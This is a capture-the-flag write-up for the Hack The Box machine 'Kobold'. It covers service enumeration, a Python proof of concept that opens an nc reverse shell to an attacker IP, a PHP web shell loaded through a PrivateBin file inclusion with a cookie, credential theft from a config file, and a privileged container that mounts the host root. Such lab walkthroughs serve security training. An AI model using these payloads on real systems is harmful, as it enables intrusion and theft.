https://app.hackthebox.com/machines/Kobold

## ENUMERATION

Ports :

```text
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)  
80/tcp   open  http     nginx 1.24.0 (Ubuntu)  
443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)  
3552/tcp open  http     Golang net/http server  

```

Interresting :

* **Ports 80/443 (HTTP/HTTPS):** Standard web server. No immediate vectors found except for a potential contact email address: `admin@kobold.htb` (might be useful)
* **Port 3552 (Golang HTTP):** Exposes a web application. The Nmap fingerprint shows a specific endpoint: `/api/app-images/favicon`.



let's use `ffuf` in order to discover API endpoints :

```bash
ffuf -u http://10.129.31.85:3552/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt

```

**Results:**

```text
docs                    [Status: 200, Size: 604]  
events                  [Status: 401, Size: 159]  
users/login             [Status: 401, Size: 159]  
users/current           [Status: 401, Size: 159]  
health                  [Status: 200, Size: 92]  
templates               [Status: 200, Size: 187]  
users                   [Status: 401, Size: 159]  
version                 [Status: 200, Size: 191]  

```

Navigating to the `/api/docs` endpoint revealed the **Arcane API** documentation running OpenAPI 3.1.0. This API allows container management, but requires valid authentication credentials (default pairs failed).

Let's see if there is any interresting subdomain :

```bash
gobuster vhost -u http://kobold.htb -k --append-domain -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -r

```

Two key subdomains were successfully identified despite DNS routing anomalies:

1. `bin.kobold.htb` $\rightarrow$ Running **PrivateBin v2.0.2**
2. `mcp.kobold.htb` $\rightarrow$ Running **MCPJam v1.4.2**

## INITIAL ACCESS

The **MCPJam v1.4.2** instance is vulnerable to a Remote Code Execution flaw (**CVE-2026-23744**) via the connection API endpoint due to insecure command argument handling.

### Exploit Execution

The following Proof-of-Concept script was executed to trigger a reverse shell:

```python
import requests

target = "https://mcp.kobold.htb:443"
ip = "10.10.14.184"
port = "1337"
url = f'{target}/api/mcp/connect'

data = {
    "serverConfig": {
        "command": "busybox",
        "args": ["nc", f"{ip}", f"{port}", "-e", "/bin/bash"],
        "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
}

response = requests.post(url, json=data, verify=False)
print(f"Status: {response.status_code}")
```

A stable shell was successfully established as the user `ben`. Traditional privilege escalation vectors via LinPEAS yielded no immediate paths.

## LATERAL MOVEMENT (Exploiting PrivateBin LFI)

* The system has another user named `alice`, who belongs to the `docker` group (`docker:x:111:alice`).
* The `operator` group grants write access to the `/privatebin-data/` directory, which serves as a mounted volume for the PrivateBin Docker container.
* **PrivateBin** is vulnerable to a Local File Inclusion vulnerability (**CVE-2025-64714**) when custom template selection is enabled via the `template` cookie.

Since the `/privatebin-data/data/` directory is writable from our current context I dropped a malicious PHP into the volume storage:

```bash
cat > /privatebin-data/data/pwn.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

```

The LFI was triggered via `curl` by manipulating the session cookie to execute the payload:

```bash
curl -k https://bin.kobold.htb/ -b "template=../data/pwn" -G --data-urlencode "cmd=id"

```

```text
uid=65534(nobody) gid=82(www-data) groups=82(www-data)

```

The configuration file `/srv/cfg/conf.php` was extracted using the payload:

```bash
curl -k https://bin.kobold.htb/ -b "template=../data/pwn" -G --data-urlencode "cmd=cat /srv/cfg/conf.php"

```

And I found some credentials :

```ini
[model_options]  
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"  
usr = "privatebin"  
pwd = "ComplexP@sswordAdmin1928"  

```

## OWN ROOT

The leaked password was cross-referenced with the previously discovered **Arcane API** on port 3552. Authenticating with the default application user profile worked:

* **Username:** `arcane`
* **Password:** `ComplexP@sswordAdmin1928`

Using the container management privileges afforded by the Arcane API, I can deploy a malicious container that mount the filesystem :

* **Container Name:** `zeroz`
* **Image:** `privatebin/nginx-fpm-alpine:2.0.2` (Known cached image)
* **Command:** `/bin/bash`
* **User ID:** `0` (Root)
* **Volume Binding:** `/` $\rightarrow$ `/hostfs`
* **Security Settings:** `Privileged Mode = Enabled`

Done !